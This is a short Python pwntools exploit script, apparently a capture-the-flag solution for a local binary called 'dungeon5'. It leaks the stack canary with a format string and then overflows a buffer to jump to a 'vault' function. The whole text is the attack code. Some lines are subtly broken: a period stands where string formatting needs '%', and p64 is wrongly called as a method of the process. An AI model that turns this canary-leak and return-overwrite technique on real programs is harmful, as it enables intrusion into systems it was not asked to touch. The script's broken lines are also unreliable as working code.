from pwn import * 
exe ='./dungeon5'
elf = context.binary = ELF('./dungeon5' , checksec= False) 
p = process("./dungeon5")

print(p.recvline())

#leak canary from the stack using format string vulnerability (#15th element)
p.sendline('%15$p')
# print canary in hex and in decimal
canary = int(p.recvline().strip(), 16) 
info('dungeon5= 0x%x(%d)'. canary, canary)
print(p.recvline())

# payload, because it's a 64bit system everything except my 72 A's is packed using the p64 method which converts the variable to 8 bytes
payload = (b"A" * 72) 
payload += p64(canary)
payload += p64(0)
# jump to the vault function
payload += p.p64(elf.symbols.vault)

p.sendline(payload)

p.interactive()
